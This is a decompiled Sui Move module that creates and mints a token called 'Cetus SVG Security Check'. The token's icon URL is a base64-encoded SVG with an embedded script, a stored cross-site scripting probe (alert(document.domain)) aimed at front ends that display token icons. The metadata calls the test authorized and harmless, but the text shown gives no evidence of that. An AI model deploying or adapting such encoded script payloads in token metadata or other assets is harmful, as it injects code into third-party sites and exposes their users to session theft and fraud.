module 0xbe3259363895469c6d1b4c71450d004208eed870b0f2786b8f2e56365426f636::svg_check {
    struct SVG_CHECK has drop {
        dummy_field: bool,
    }

    fun init(arg0: SVG_CHECK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<SVG_CHECK>(arg0, 6, b"SVGTEST", b"Cetus SVG Security Check", b"Authorized security validation. Harmless alert(document.domain) only.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPg==")), arg1);
        let v2 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SVG_CHECK>>(v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<SVG_CHECK>>(0x2::coin::mint<SVG_CHECK>(&mut v2, 1000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SVG_CHECK>>(v2, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

